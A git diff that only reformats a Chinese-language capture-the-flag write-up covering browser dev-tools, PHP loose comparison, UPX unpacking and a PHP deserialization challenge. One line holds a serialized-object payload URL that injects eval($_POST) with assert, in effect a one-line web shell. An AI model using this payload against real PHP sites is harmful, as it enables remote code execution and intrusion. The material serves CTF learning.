@@ -9,6 +9,12 @@ zoe
 
 （我好像能拿奖品？）
 
+
+
+[TOC]
+
+
+
 ## test your F12
 
 ![image-20200922092931276](wp.assets/image-20200922092931276.png)
@@ -55,7 +61,9 @@ PHP 弱类型松散比较，以`"1"`为例，和`TRUE`,`1`,`"1"`相等。
 
 看php代码，用data=里面的东西的反序列化怎么搞
 
-```http://47.93.116.52:20001/time.php?data=O:8:%22HelloPhp%22:2:{s:1:%22a%22;s:19:%22eval($_POST[%22aaa%22])%22;s:1:%22b%22;s:6:%22assert%22;}```
+```
+http://47.93.116.52:20001/time.php?data=O:8:%22HelloPhp%22:2:{s:1:%22a%22;s:19:%22eval($_POST[%22aaa%22])%22;s:1:%22b%22;s:6:%22assert%22;}
+```
 
 ![image-20200922094536883](wp.assets/image-20200922094536883.png)
 
@@ -127,11 +135,13 @@ rabbit解出来
 
 flag在网页代码里
 
-视频 https://www.youtube.com/watch?v=9CDyU48wcE4
+视频  <https://www.youtube.com/watch?v=9CDyU48wcE4>
 
 备用 
 
-``` 链接:https://pan.baidu.com/s/12-aYtipvspVaiQRbbiOuXA 提取码:s1ef```
+``` 
+链接:https://pan.baidu.com/s/12-aYtipvspVaiQRbbiOuXA 提取码:s1ef
+```
 
 ## 拼图
 
@@ -147,7 +157,9 @@ flag在网页代码里
 
 google一下，都说是UPX加壳
 
-```upx -d xxx```
+```
+upx -d xxx
+```
 
 好像就是这么脱壳，然后放到IDA里看
 
